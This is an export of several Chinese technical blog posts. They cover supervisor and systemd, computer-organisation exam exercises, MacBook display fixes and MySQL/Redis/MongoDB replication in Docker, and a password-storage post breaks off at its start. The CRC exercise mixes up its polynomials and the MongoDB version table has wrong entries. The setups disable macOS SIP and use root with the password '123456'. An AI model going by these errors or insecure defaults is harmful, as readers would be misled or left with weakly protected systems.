[{"title":"supervisor进程管理使用","url":"%2Fp%2F1825ecdb.html","content":"\nsupervisor是一个C/S系统,它可以在类UNIX系统上控制系统进程，由python编写，提供了大量的功能来实现对进程的管理。\n\n<!-- more -->\n\n# 1. supervisor 介绍\n\nsupervisor主要包含以下四个部分：\n\n+ supervisord：\n\n  这个是supervisor服务的主要管理器，负责管理我们配置的子进程，包括重启崩溃或异常退出的子进程，同时也响应来自客户端的请求。\n\n+ supervisorctl：\n\n  supervisord服务的客户端命令行。听过这个，我们可以获得由主进程控制的子进程的状态，停止和启动子进程，并获得主进程的运行列表。\n\n+ Web Server：\n\n  supervisorctl功能娉美。这个是通过web界面查看和控制进程状态。\n\n+ XML-RPC Interface：\n\n  服务于web UI的同一个HTTP服务器提供一个XML-RPC接口，可以用来询问和控制管理程序及其运行的程序\n\n\n\n# 2. supervisor安装\n\n```bash\n# 安装\nsudo pip install supervisor\n\n# 启动服务\nsupervisord -c /etc/supervisord.conf\n\n# 查看是否启动\nps -ef | grep supervisord\n```\n\n\n\n# 3. supervisor配置\n\nsupervisor 是一个 C/S 模型的程序，supervisord是 server 端，对应的 client 端：supervisorctl\n\n### 3.1 默认配置\n\n运行`echo_supervisord_conf` 命令输出默认的配置项, 默认 supervisor 会使用 /etc/supervisord.conf 作为默认配置文件。\n\n文件内可以看到如下配置, 所以自定义的配置文件可以放到`/etc/supervisor/conf.d/`文件夹下.\n\n```ini\n[include]\nfiles = /etc/supervisor/conf.d/*.conf\n```\n\n\n\n### 3.2 应用程序配置\n\n```ini\n[program:usercenter]  # usercenter 是应用程序的唯一标识，不能重复。对该程序的所有操作（start, restart 等）都通过名字来实现。\ndirectory = /home/leon/projects/usercenter ; 程序的启动目录\ncommand = gunicorn -w 8 -b 0.0.0.0:17510 wsgi:app  ; 启动命令\nautostart = true     ; 在 supervisord 启动的时候也自动启动\nstartsecs = 5        ; 启动 5 秒后没有异常退出，就当作已经正常启动了\nautorestart = true   ; 程序异常退出后自动重启\nstartretries = 3     ; 启动失败自动重试次数，默认是 3\nuser = leon          ; 用哪个用户启动\nredirect_stderr = true  ; 把 stderr 重定向到 stdout，默认 false\nstdout_logfile_maxbytes = 20MB  ; stdout 日志文件大小，默认 50MB\nstdout_logfile_backups = 20     ; stdout 日志文件备份数, 需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录\nstdout_logfile = /data/logs/usercenter_stdout.log\n```\n\n\n\n### 3.3 使用\n\n+ 更新配置, 修改配置后需要更新\n\n  ```bash\nsupervisorctl update\n  ```\n  \n+ 查看log, 直接查看配置里的log 即可\n\n  ```bash\nstdout_logfile=/home/supervisor_log/uwsgi.log            \n  stderr_logfile=/home/supervisor_log/uwsgi.log\n  ```\n\n\n\n# 4. supervisor 常用命令\n\n```bash\nsupervisorctl update #更新新的配置到supervisord（不会重启原来已运行的程序）\nsupervisorctl reload #载入所有配置文件，并按新的配置启动、管理所有进程（会重启原来已运行的程序）\n\nsupervisorctl start xxx #启动某个进程\nsupervisorctl restart xxx #重启某个进程\nsupervisorctl stop xxx #停止某一个进程(xxx)，xxx为[program:theprogramname]里配置的值\nsupervisorctl stop groupworker #重启所有属于名为groupworker这个分组的进程(start,restart同理)\nsupervisorctl stop all #停止全部进程，注：start、restart、stop都不会载入最新的配置文\n\nsupervisorctl reread #当一个服务由自动启动修改为手动启动时执行一下就ok\n```\n\n\n\n# 5. systemd介绍\n\n> Systemd是Linux中的No.1进程, 可以用 systemd 管理 supervisor\n\nLinux 操作系统的启动首先从 BIOS 开始，然后由 Boot Loader 载入内核，并初始化内核。内核初始化的最后一步就是启动 init 进程。这个进程是系统的第一个进程，PID 为 1，又叫超级进程，也叫根进程。它负责产生其他所有用户进程。所有的进程都会被挂在这个进程下，如果这个进程退出了，那么所有的进程都被 kill 。如果一个子进程的父进程退了，那么这个子进程会被挂到 PID 1 下面。\n\n2010的有一天，一个在 RedHat工作的工程师 Lennart Poettering 和 Kay Sievers ，开始引入了一个新的 init 系统—— systemd。这是一个非常非常有野心的项目，这个项目几乎改变了所有的东西，systemd 不但想取代已有的 init 系统，而且还想干更多的东西。\n\n2014 年，Debian Linux 因为想准备使用 systemd 来作为标准的 init 守护进程来替换 sysvinit 。而围绕这个事的争论达到了空前的热度，争论中充满着仇恨，systemd 的支持者和反对者都在互相辱骂，导致当时 Debian 阵营开始分裂。\n\n今天，systemd 占据了几乎所有的主流的 Linux 发行版的默认配置，包括：Arch Linux、CentOS、CoreOS、Debian、Fedora、Megeia、OpenSUSE、RHEL、SUSE企业版和 Ubuntu。而且，对于 CentOS, CoreOS, Fedora, RHEL, SUSE这些发行版来说，不能没有 systemd。\n\n\n\n# 6. supervisor和 systemd 对比\n\n### 6.1 supervisor\n\n+ 优点\n\n  1 可以通过网页执行启动停止的操作\n  2 单配置文件可控制多个程序\n  3 可控制进程数量\n  4 进程资源控制能力比较强\n\n+ 缺点\n\n  1 本身需要被监控\n  2 开机自启依赖其他程序\n  3 不能跨主机\n  4 依赖于meld3、setuptools\n  5 进程需在前台运行\n\n\n\n### 6.2 systemd\n\n+ 优点\n\n  1可使用模板文件\n  2 附带定时器、路径监控器、数据监控器等功能\n  3 比较弱的跨主机能力，节点必须互相添加ssh key信任，只能远程控制已有的服务\n  4 开机可以自启\n  5 大多数发行版的标准配置\n  6 配套journalctl二进制保存日志很难伪造，日志格式统一，日志大小可限制\n  7 限制特定服务可用的系统资源量例如CPU、程序堆栈、文件句柄数量、子进程数量\n\n+ 缺点\n\n  1 多配置文件才能配置多个程序\n\n  \n\n# 7. 参考资料\n\n+ http://supervisord.org/index.html\n+ https://woni.link/post/12\n+ https://coolshell.cn/articles/17998.html","tags":["supervisor"],"categories":["命令"]},{"title":"计算机组成原理相关考题","url":"%2Fp%2F240de068.html","content":"\n\n\n# 1. 计算200.11D的 IEEE754单精度浮点数\n\n### 1.1 整数部分200求二进制\n\n|       | 结果 | 余数 |\n| ----- | ---- | ---- |\n| 200/2 | 100  | 0    |\n| 100/2 | 50   | 0    |\n| 50/2  | 25   | 0    |\n| 25/2  | 12   | 1    |\n| 12/2  | 6    | 0    |\n| 6/2   | 3    | 0    |\n| 3/2   | 1    | 1    |\n| 1/2   | 0    | 1    |\n\n二进制为: 1100 1000 (倒序)\n\n<!-- more -->\n\n### 1.2 小数部分0.11求二进制\n\n|        | 结果 | 整数部分 |\n| ------ | ---- | -------- |\n| 0.11*2 | 0.22 | 0        |\n| 0.22*2 | 0.44 | 0        |\n| 0.44*2 | 0.88 | 0        |\n| 0.88*2 | 1.76 | 1        |\n| 0.76*2 | 1.52 | 1        |\n| 0.52*2 | 1.04 | 1        |\n| 0.04*2 | 0.08 | 0        |\n| 0.08*2 | 0.16 | 0        |\n\n二进制为 0001 1100(正序)\n\n整个二进制为: 200.11D = 11001000.00011100\n\n### 1.3 求IEEE754\n\n+ 计算\n\n  ```bash\n  +200.11 = +11001000.00011100\n  \n  = +1.1001000 00011100 * 2^7    e=7=134-127\n  \n  S = 0(符号位)\n  E = 134D =10000110B (134的二进制)\n  M = 1001 0000 0011 1000 0000 000 (小数点1后面的,补齐23位)\n  ```\n\n+ 所以二进制存储格式为\n\n  | 符号位 | E(8位)    | M(23位)                      |\n  | ------ | --------- | ---------------------------- |\n  | 0      | 1000 0110 | 1001 0000 0011 1000 0000 000 |\n\n  ![1](计算机组成原理校验码考题/1.png)\n\n### 1.4 总结\n\n+ 单精度浮点数字长32位，尾数长度23，指数长度8, 指数偏移量127；\n\n+ https://www.binaryconvert.com/convert_float.html\n\n\n\n# 2. 计算10001101的奇校验码和偶校验码(校验位放在首位)\n\nP=D1⊕D2⊕D3⊕D4⊕D5⊕D6⊕D7⊕D8\n\nP* =P⊕D1⊕D2⊕D3⊕D4⊕D5⊕D6⊕D7⊕D8\n\n数据: 10001101 \n\n+ 奇校验码(1的个数为奇数)\n\n  1 10001101\n\n+ 偶校验码(1的个数为偶数)\n\n  0 10001101\n\n\n\n# 3. 计算数据 D=D4D3D2D1=1110的海明码(奇校验)\n\n### 3.1 计算\n\n2^r >= 4+1+r,   r = 3\n\n数据位为 D4D3D2D1\n\n校验位为 P3P2P1\n\n| 索引       | 7     | 6    | 5    | 4    | 3    | 2    | 1    |\n| ---------- | ----- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 信息位     | D4    | D3   | D2   | P3   | D1   | P2   | P1   |\n| 信息位值 | 1     | 1    | 1    | P3   | 0    | P2   | P1   |\n| 二进制 | 111 | 110 | 101 | (100) | 011 | (010) | (001) |\n\n\nP1 = D1⊕ D2 ⊕ D4 =  0 ⊕ 1 ⊕ 1 = 1(奇检验)\n\nP2 = D1⊕ D3 ⊕ D4 = 0 ⊕ 1 ⊕ 1 = 1(奇检验)\n\nP3 = D2⊕ D3 ⊕ D4 = 1 ⊕ 1 ⊕ 1 = 0(奇检验)\n\n所以奇校验的海明码为:  111 P3 0 P2 P1 =  1110 011\n\n### 3.2 总结\n\n+ 2^r ≥ k+r+1,  r 是校验位\n\n\n\n# 4. 计算信息多项式:101010110,生成多项式1100的CRC校验码\n\n1110 = x^3 + x^2 + x^ 1 + 0\n\n+ 先补充最高位次数,   101010 110 000\n+ 除数1100\n\n| 商:     |       |       |         | 1       | 1    | 0    | 0    | 1    | 1 | 0 | 1 | 1 | | |\n| ------- | ----- | ----- | ------- | ------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------- | ------- |\n| 被除数: | 1     | 0     | 1       | 0       | 1    | 0    | 1    | 1    | 0    | 0    | 0    | 0    | | |\n|     | **1** | **1** | **0** | **0** |      |      |      |      |      |      |      |      | | |\n|     |       | 1     | 1       | 0       | 1    |      |      |      |      |      |      |      | | |\n|     |       | **1** | **1**   | **0**   | **0** |      |      |      |      |      |      |      | | |\n|     |       |       |         |         | 1    | 0    | 1    | 1    |      |      |      |      | | |\n|     |       |       |         |         | **1** | **1** | **0** | **0** |      |      |      |      | | |\n|     |       |       |         |         |      | 1 | 1 | 1 | 0 |      |      |      | | |\n|     |       |       |         |      |   | **1** | **1** | **0** | **0** |      |      |      | | |\n|     |       |       |         |         |      |      |      | 1 | 0 | 0 | 0 |      | | |\n|     |       |       |         |         |      |      |   | **1** | **1** | **0** | **0** |      | | |\n|     |       |       |         |         |      |      |      |      | 1 | 0 | 0 | 0 | | |\n|  | | | | | | | | | **1** | **1** | **0** | **0** | | |\n|  | | | | | | | | |  | 1 | 0 | 0 | | |\n|  | | | | | | | | |  |  |  |  | | |\n\n余数为100\n\n所以CRC校验码为: 101010110 100\n\n### 4.2 计算步骤\n\n1. 用最高位补齐被除数\n2. 拿出除数, 进行异或运算\n3. 商: 够除是1, 不够除是0\n4. 如果余数不足最高次数,  需要补齐0\n5. 把余数放在多项式后面即可\n\n\n\n# 5. 寻址方式\n\n+ 指令寻址方式\n\n+ 操作数寻址方式\n\n  + 立即寻址\n\n    指令中直接给出操作数，指令中的形式地址字段即为操作数，又称为立即数寻址。\n\n  + 隐含寻址\n\n    隐含寻址是指令字中不明确给出操作数的地址，其操作数隐含在操作码或某个寄存器中。\n\n  + 直接寻址\n\n      指令中地址码字段中给出的地址，即为操作数在主存中的地址，操作数在主存中。\n\n  + 间接寻址\n\n    指令中地址码字段中给出的地址，是操作数在主存中地址的地址，操作数在主存中。\n\n  + 寄存器直接寻址\n\n      指令中地址码给出的是寄存器的编号，操作数在指定的寄存器中。\n\n      由于操作数不在主存中,故这种寻址方式无需访存，减少了指令执行时间。由于地址字段只需指明寄存器编号,故位数较少，节省了存储空间。  因此，寄存器直接寻址方式得到广泛应用。\n\n  + 寄存器间接寻址\n\n    指令中地址码给出的是寄存器的编号，该寄存器中的内容为操作数地址，操作数在主存中。\n\n     这也是一种访内的寻址方式，与存储器间接寻址相比较，只需一次访内即可获得操作数，提高了执行速度，同样得到广泛应用。\n\n  + 相对寻址\n\n    相对寻址是把程序计数器PC的内容加上指令格式中的形式地址D(相对量)而形成操作数的有效地址。\n\n    相对寻址的最大特点是操作数地址与指令地址之间总是相差一个固定值，操作数地址随PC的变化而变化。因此，支持程序在主存中任意浮动。\n\n  + 变址寻址\n\n    变址寻址方式：是把变址寄存器BX的内容与偏移量D之和作为操作数有效地址。(有时通用寄存器也可作为变址器使用)\n\n    变址寄存器的内容是由程序员设定的，在程序执行过程中其内容可变，而指令字中的偏移量D是不可变的。 变址寻址主要用于数组处理。\n\n  + 基址寻址\n\n    基址寻址方式：是把变址寄存器BR的内容与偏移量D之和作为操作数有效地址。(有时通用寄存器也可作为变址器使用)\n\n    基址寻址可以扩大指令对主存的寻址范围。在多道程序和浮动程序编制时十分有用。\n\n  + 段寻址\n\n     段寻址是一种为了扩大寻址范围而采用的技术。\n\n    如采用将16位的段寄存器左移4位、加上16位的偏移量形成20位的物理地址，扩大了寻址空间。\n    \n  + 复合寻址方式：\n\n     是将两种基本寻址方式结合形成。\n\n\n\n# 6. 参考资料\n\n+ https://blog.csdn.net/crjmail/article/details/79723051\n+ https://zhuanlan.zhihu.com/p/26509678\n+ https://www.bilibili.com/video/BV1SJ41157pR\n+ https://www.bilibili.com/video/BV1xJ411K7Wx","tags":["校验码"],"categories":["计算机基础"]},{"title":"macbook外接显示器模糊问题","url":"%2Fp%2Fa6586325.html","content":"\n# 1. 解决方案\n\n### 1.0 禁止SIP前提\n\n`command + R` 进入mac安全模式, 禁止SIP\n\n```bash\ncsrutil disable\n```\n\n<!-- more -->\n\n### 1.1 TV 模式强制到 RGB mode\n\n+ 参考教程:\n\n  https://www.zhihu.com/question/19682094/answer/122193822\n\n  \n\n### 1.2 一键脚本开启HiDPI\n\nHiDPI本质上是用软件的方式实现单位面积内的高密度像素。用四个像素点来表现一个像素，因此能够更加清晰细腻。\n\n**高PPI(硬件) + HiDPI渲染(软件) = 更细腻的显示效果(retina)**\n\n+ 项目地址\n\n  https://github.com/xzhih/one-key-hidpi\n\n+ 参考教程:\n\n  https://blog.haitianhome.com/macbook-2k-hidpi.html\n\n  选择时选择最大的即可\n\n\n\n### 1.3 安装RDM软件\n\n+ 项目地址\n\n  https://github.com/avibrazil/RDM\n\n+ 参考教程:\n\n  https://www.zhihu.com/question/19682094/answer/669420795 \n\n\n\n# 2. 显示器接口介绍\n\n目前显示器的的接口有DP HDMI VGA DVI这几种，这些接口的形状也都不同，我们在选购主机的时候，一般都要考虑主机的显卡接口是否与显示器接口相匹配。VGA目前被淘汰掉了，这是因为VGA传输的是模拟信号。\n\n从接口性能上来看，显示器接口的性能是 DP>HDMI>DVI>VGA。\n\n+ **VGA接口**\n\n  长的多针孔\n\n  其中 VGA是模拟信号，目前已经被主流淘汰，这也是我们目前能在最新显卡上看到其他三种接口却看不到VGA接口的原因，DVI、HDMI、DP 都是数字信号，是目前的主流。\n\n+ **DVI接口**\n\n  DVI是高清接口，但不带音频，也就是说，DVI视频接线只传输画面图形信号，但不传输音频信号。但是DVI接口也有不少弊端：由于最初设计时是为PC端进行的，所以对于电视等兼容能力较差、只支持8bit的RGB信号传输、兼容性考虑，预留了不少引脚以支持模拟设备，造成接口体积较大。目前比较好的DVI接口能够传输2K画面，但也基本是极限了。\n\n+ **HDMI接口**\n\n  长的类似USB\n\n  HDMI既能传输高清图形画面信号，也能够传输音频信号。\n\n+ **DP接口**\n\n  DP接口也是一种高清数字显示接口标准，可以连接电脑和显示器，也可以连接电脑和家庭影院。DP接口可以理解是HDMI的加强版，在音频和视频传输方面更加强悍。\n\n  目前情况下，DP与HDMI在性能上没有多大区别。如果你使用3840*2160分辨率（4K），HDMI由于带宽不足，最大只能传送30帧，DP就没有问题。\n\n+ 参考资料\n\n  https://www.zhihu.com/question/19571221/answer/569037388\n\n\n\n# 3. 参考资料\n\n+ https://www.zhihu.com/question/19682094\n+ https://sspai.com/post/57549\n+ https://blog.haitianhome.com/macbook-2k-hidpi.html\n+ https://zhuanlan.zhihu.com/p/43249762","tags":["mac"],"categories":["软件"]},{"title":"数据库的主从复制","url":"%2Fp%2F2aa5fdb4.html","content":"\n# 1. Mysql主从复制\n\nMySQL主从复制涉及到三个线程\n\n+ 一个运行在主节点（log dump thread）\n\n+ 其余两个(I/O thread, SQL thread)运行在从节点\n\n![1](数据库的主从复制/1.jpg)\n\n<!-- more -->\n\n### 1.1 MySQL 复制过程\n\n要实施复制，首先必须打开Master 端的binary log（bin-log）功能，否则无法实现。\n\n+ **主节点 binary log dump 线程**\n\n  当从节点连接主节点时，主节点会创建一个log dump 线程，用于发送bin-log的内容。在读取bin-log中的操作时，此线程会对主节点上的bin-log加锁，当读取完成，甚至在发动给从节点之前，锁会被释放。\n\n+ **从节点I/O线程**\n\n  当从节点上执行`start slave`命令之后，从节点会创建一个I/O线程用来连接主节点，请求主库中更新的bin-log。I/O线程接收到主节点binlog dump 进程发来的更新之后，保存在本地relay-log中。\n\n+ **从节点SQL线程**\n\n  SQL线程负责读取relay log中的内容，解析成具体的操作并执行，最终保证主从数据的一致性。\n\n\n\n### 1.2 MySQL 主从复制模式\n\nMySQL 主从复制默认是异步的模式。\n\nMySQL增删改操作会全部记录在binary log中，当slave节点连接master时，会主动从master处获取最新的bin log文件。并把bin log中的sql relay。\n\n+ **异步模式**\n\n  主节点不会主动push bin log到从节点，这样有可能导致failover的情况下，也许从节点没有即时地将最新的bin log同步到本地。\n\n+ **半同步模式(mysql semi-sync)**\n\n  主节点只需要接收到其中一台从节点的返回信息，就会commit；否则需要等待直到超时时间然后切换成异步模式再提交。\n\n  binlog至少传输到了一个从节点上，不能保证从节点将此事务更新到db中。性能上会有一定的降低，响应时间会变长。\n\n+ **全同步模式**\n\n  全同步模式是指主节点和从节点全部执行了commit并确认才会向客户端返回成功。\n\n\n\n### 1.3 MySQL 复制方式\n\n+ 基于SQL语句的复制（statement-based replication，SBR）\n\n  就是记录sql语句在bin log中，Mysql 5.1.4 及之前的版本都是使用的这种复制格式。\n\n  优点是只需要记录会修改数据的sql语句到binlog中，减少了binlog日志量，节约I/O，提高性能。\n\n  缺点是在某些情况下，会导致主从节点中数据不一致（比如now()函数等）。\n\n  \n\n+ 基于行的复制（row-based replication，RBR)\n\n  mysql master将SQL语句分解为基于Row更改的语句并记录在bin log中，也就是只记录哪条数据被修改了，修改成什么样。\n\n  优点是不会出现某些特定情况下的存储过程、或者函数、或者trigger的调用或者触发无法被正确复制的问题。\n\n  缺点是会产生大量的日志，尤其是修改table的时候会让日志暴增,同时增加bin log同步时间。也不能通过bin log解析获取执行过的sql语句，只能看到发生的data变更。\n\n  \n\n+ 混合模式复制（mixed-based replication,MBR)\n\n  MySQL NDB cluster 7.3 和7.4 使用的MBR。是以上两种模式的混合，对于一般的复制使用STATEMENT模式保存到binlog，对于STATEMENT模式无法复制的操作则使用ROW模式来保存，MySQL会根据执行的SQL语句选择日志保存方式。\n\n\n\n### 1.4 操作\n\n+ docker 运行 mysql\n\n  ```bash\n  docker pull mysql:5.7 # 拉取镜像\n\n  docker run --name mysql1 -p 33061:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # 运行第一个 mysql\n  docker run --name mysql2 -p 33062:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # 运行第二个 mysql\n  ```\n\n​\t第一个当做主服务器, 第二个当做从服务器\n\n+ 主服务器配置\n\n  ```bash\n  # 1. 进入容器修改配置文件\n  docker exec -it mysql1 /bin/bash\n\n  vi /etc/mysql/mysql.conf.d/mysqld.cnf\n  [mysqld]\n  server-id=1\n  log-bin=mysql-bin\n\n  docker restart mysql1\n\n  # 2. 配置权限, 可以被连接\nmysql -u root -p\n  grant replication slave on *.* to 'root'@'172.17.0.1' identified by '123456';\n  flush privileges;\n  show master status\\G\n  *************************** 1. row ***************************\n             File: mysql-bin.000003\n           Position: 319\n       Binlog_Do_DB:\n   Binlog_Ignore_DB:\n  Executed_Gtid_Set:\n  ```\n  \n+ 从服务器配置\n\n  ```bash\n  # 1. 进入容器修改配置文件\n  docker exec -it mysql2 /bin/bash\n  \n  vi /etc/mysql/mysql.conf.d/mysqld.cnf\n[mysqld]\n  server-id=2\n  log-bin=mysql-bin\n  \n  docker restart mysql2\n  \n  \n  # 2.开启slave, 可以被访问\n  mysql -u root -p\n  \n  # 172.17.0.1 是docker mac 本机 ip, 33061是 主的端口\n  change master to master_host='172.17.0.1',\n  master_port=33061,\n  master_user='root',\n  master_password='123456',\n  master_log_file='mysql-bin.000003',\n  master_log_pos=319; \n  \n  \n  start slave;\n  show slave status\\G\n  *************************** 1. row ***************************\n                 Slave_IO_State: Waiting for master to send event\n                    Master_Host: 172.17.0.1\n                    Master_User: root\n                    Master_Port: 33061\n                  Connect_Retry: 60\n                Master_Log_File: mysql-bin.000003\n            Read_Master_Log_Pos: 649\n                 Relay_Log_File: 9339fdceb667-relay-bin.000002\n                  Relay_Log_Pos: 650\n          Relay_Master_Log_File: mysql-bin.000003\n               Slave_IO_Running: Yes\n              Slave_SQL_Running: Yes\n  ```\n  \n+ 测试\n\n  ```bash\n  # 主数据库创建\n  create database test_1;\n  # 从数据查看, 即可以看到\n  show databases;\n  ```\n\n  \n\n# 2. redis 主从复制\n\n主服务器负责接收写请求, 从服务器负责接收读请求(从服务器无法进行写操作)\n\n### 2.1 同步模式\n\n+ 完整重同步(redis 2.8以前)\n  + 从服务器向主服务器发送PSYNC命令\n  \n  + 收到PSYNC命令的主服务器执行BGSAVE命令，在后台**生成一个RDB文件**。并用一个**缓冲区**来记录从现在开始执行的所有**写命令**。\n  \n  + 当主服务器的BGSAVE命令执行完后，将生成的RDB文件发送给从服务器，**从服务器接收和载入RDB文件**。将自己的数据库状态更新至与主服务器执行BGSAVE命令时的状态。\n  \n  + 主服务器将所有缓冲区的**写命令发送给从服务器**，从服务器执行这些写命令，达到数据最终一致性。\n  \n    \n  \n+ 部分重同步\n\n  + 主从服务器的复制偏移量\n\n    - 主服务器每次传播N个字节，就将自己的复制偏移量加上N\n\n    - 从服务器每次收到主服务器的N个字节，就将自己的复制偏移量加上N\n\n      \n\n  + 主服务器的复制积压缓冲区\n\n    主服务器进行命令传播时，不仅仅会将写命令发送给所有的从服务器，还会将写命令**入队到复制积压缓冲区**里面(这个大小可以调的)。如果复制积压缓冲区**存在**丢失的偏移量的数据，那就执行部分重同步，否则执行完整重同步。\n\n    \n\n  + 服务器运行的ID(**run ID**)\n\n    服务器运行的ID(**run ID**)实际上就是用来比对ID是否相同。如果不相同，则说明从服务器断线之前复制的主服务器和当前连接的主服务器是两台服务器，这就会进行完整重同步。\n\n    \n\n+ 命令传播\n\n  当完成了同步之后，主从服务器就会进入命令传播阶段。这时主服务器只要将自己的写命令发送给从服务器，而从服务器接收并执行主服务器发送过来的写命令，就可以保证主从服务器一直保持数据一致了！\n\n  在命令传播阶段，从服务器默认会以每秒一次的频率，向服务器发送命令`REPLCONF ACK <replication_offset>` 其中replication_offset是从服务器当前的复制偏移量\n\n\n\n### 2.2 操作\n\n+ 下载\n\n  ```bash\n  # 下载\n  docker pull redis:latest\n\n  # 下载配置文件 \n  http://download.redis.io/redis-stable/redis.conf\n\n  # 主redis配置, 无需特殊配置, 因为在 docker 内, 需要修改一下bind\n  vi $PWD/redis1/redis.conf\n  bind 127.0.0.1 改为 bind 0.0.0.0\n\n  # 修改从redis配置, 修改 redis.conf 文件\n  vi $PWD/redis2/redis.conf\n  slaveof 172.17.0.1 63791\n  ```\n\n+ 启动\n\n  ```bash\n  # 主服务器\n  docker run \\\n  -p 63791:6379 \\\n  -v $PWD/redis1/redis.conf:/etc/redis/redis.conf \\\n  --privileged=true \\\n  --name redis1 \\\n  -d redis redis-server /etc/redis/redis.conf\n\n  # 从服务器\n  docker run \\\n  -p 63792:6379 \\\n  -v $PWD/redis2/redis.conf:/etc/redis/redis.conf \\\n  --privileged=true \\\n  --name redis2 \\\n  -d redis redis-server /etc/redis/redis.conf\n  ```\n\n+ 测试\n\n  ```bash\n  # 查看配置文件\n  redis-cli info | grep config_file\n  \n  # 查看从的状态, 看到master_link_status:up就是成功\n  redis-cli info | grep master\n  master_host:172.17.0.1\n  master_port:63791\n  master_link_status:up\n\n\t# 然后在主服务器 set key, 在从服务器 get 即可\n  ```\n  \n  \n\n# 3. mongodb 副本集\n\n在 MongoDB 中,有两种数据冗余方式,一种 是 Master-Slave 模式（主从复制）,一种是 Replica Sets 模式（副本集）。\n\nMongoDB 的最新版本已经不再支持主从复制, 建议使用副本集。\n\n### 3.1 主从复制(不推荐)\n\n+ --master用来确定主服务器\n\n+ --slave 和 --source 来控制从服务器\n+ 可以在mongodb.conf配置文件里指明主从关系，这样启动mongodb的时候只要跟上配置文件就行，就不需要通过--master和--slave来指明主从了。\n\n### 3.2 副本集\n\n只能 master 写, 从不能写.\n\n+ 下载\n\n  ```bash\n  docker pull mongo:latest\n  \n  # 主服务器\n  docker run \\\n  -d \\\n  -p 27018:27017 \\\n  --name mongo1 \\\n  mongo mongod --replSet my-mongo-set\n  \n  # 从服务器\n  docker run \\\n  -d \\\n  -p 27019:27017 \\\n  --name mongo2 \\\n  mongo mongod --replSet my-mongo-set\n  ```\n  \n+ 配置\n\n  ```bash\n  docker exec -it mongo1 mongo\n  \n  config = {\n       \"_id\" : \"my-mongo-set\",\n       \"members\" : [\n           {\n               \"_id\" : 0,\n               \"host\" : \"172.17.0.1:27018\"\n           },\n           {\n               \"_id\" : 1,\n               \"host\" : \"172.17.0.1:27019\"\n           }\n       ]\n    }\n  rs.initiate(config)\n  # 下面是输出\n  {\n          \"ok\" : 1,\n          \"$clusterTime\" : {\n                  \"clusterTime\" : Timestamp(1595349445, 1),\n                  \"signature\" : {\n                          \"hash\" : BinData(0,\"AAAAAAAAAAAAAAAAAAAAAAAAAAA=\"),\n                          \"keyId\" : NumberLong(0)\n                  }\n          },\n          \"operationTime\" : Timestamp(1595349445, 1)\n  }\n  \n  # 如果一切顺利，提示符将变成这样：(需手动随便敲命令触发下)\n  my-mongo-set:PRIMARY>\n  ```\n\n\n+ 测试\n\n  ```bash\n  # 启动从服务器\n  docker exec -it mongo2 mongo\n  my-mongo-set:PRIMARY>\n  \n  \n  # 主服务器\n  my-mongo-set:PRIMARY> db.mycollection.insert({name : 'sample'})\n  WriteResult({ \"nInserted\" : 1 })\n  my-mongo-set:PRIMARY> db.mycollection.find()\n{ \"_id\" : ObjectId(\"5f171a9bfb41dd82f33d6b2d\"), \"name\" : \"sample\" }\n  \n  # 从服务器\n  my-mongo-set:SECONDARY> db.setSlaveOk() # 设置同步\n  my-mongo-set:SECONDARY> db.mycollection.find()\n  { \"_id\" : ObjectId(\"5f171a9bfb41dd82f33d6b2d\"), \"name\" : \"sample\" }\n  \n  \n  # 查询状态\n  1. 判断是不是master: db.isMaster()\n  2. 复制集状态查询：rs.status()\n  3. 查看oplog状态： rs.printReplicationInfo()\n  4. 查看复制延迟：  rs.printSlaveReplicationInfo()\n  5. 查看服务状态详情:   db.serverStatus()\n  ```\n  \n  \n\n# 4. SQL版本历史\n\n### 4.1 mysql\n\n| 版本   | 事件                                                         | 时间 |\n| ------ | ------------------------------------------------------------ | ---- |\n| 1.0    | 仅供内部使用                                                 | 1995 |\n| 3.11.1 | First release                                                | 1996 |\n| 4.0    | Query Cache, Unions, Full-text, InnoDB                       | 2002 |\n| 5.0    | Stored Routies, Views, Cursors, Triggers, XA Transactions, I_S | 2005 |\n| 5.1    | Event scheduler, Patitioning, Plugin API, RBR, InnoDB Plugin, MySQL Cluster | 2008 |\n| 5.5    | Dtrace support, Semisync-replication, P_S, Supplementary Unicode characters。<br/>InnoDB代替MyISAM成为MySQL默认的存储引擎。 | 2010 |\n| 5.6    | Online-DDL, GTID, Parallel Replication, ICP, MRR ...etc...<br/>MySQL 5.6是MySQL历史上一个里程碑式的版本，这也是目前生产上应用得最广泛的版本。 | 2013 |\n| 5.7    | 组复制,InnoDB Cluster,多源复制                               | 2015 |\n| 8.0    | 不可见索引,降序索引                                          | 2018 |\n\n### 4.2 redis\n\n| 版本 | 时间           | 事件                                                         |\n| ---- | -------------- | ------------------------------------------------------------ |\n| 2.6  | 2012年         | 服务端支持Lua脚本。                                          |\n| 2.8  | 2013年11月22日 | 发布订阅添加了pubsub命令,slave支持从master部分同步           |\n| 3.0  | 2015年4月1日   | Redis Cluster：Redis的官方分布式实现。                       |\n| 3.2  | 2016年5月6日   | 新的List编码类型：quicklist,新的RDB格式。                    |\n| 4.0  | 2017年7月14日  | PSYNC2.0：优化了之前版本中，主从节点切换必然引起全量复制的问题。<br/>提供了RDB-AOF混合持久化格式，充分利用了AOF和RDB各自优势。 |\n| 5.0  | 2018年10月     | 新的流数据类型(Stream data type)                             |\n| 6.0  | 2020 年5月2日  | 多线程                                                       |\n\n### 4.3 mongodb\n| 版本  | 时间          | 事件                                                   |\n| ----- | ------------- | ------------------------------------------------------ |\n| 1.0   | 2009          | 首次在数据库领域亮相，打破了关系型数据库一统天下的局面 |\n| 2.0.6 | 2012          |                                                        |\n| 2.4.8 | 2013          |                                                        |\n| 3.0.1 | 2017          |                                                        |\n| 4.0.2 | 2018          | 支持多文档事务                                         |\n| 5.0   | 2019          | 引入分布式事务                                         |\n\n\n\n# 5. 问题总结\n\n+ docker 内没有命令\n\n  ```bash\n  apt update\n  apt install vim #vim\n  apt install procps # ps\n  apt install iputils-ping #ping\n  ```\n\n  \n\n# 6. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/50597960\n+ https://outmanzzq.github.io/2019/01/30/docker-mongo-replica/\n+ https://www.cnblogs.com/ivictor/p/9807284.html\n+ https://www.javazhiyin.com/36111.html","tags":["sql"],"categories":["sql"]},{"title":"如何正确存储密码","url":"%2Fp%2F4fe35076.html","content":"\n\n\n# 1. 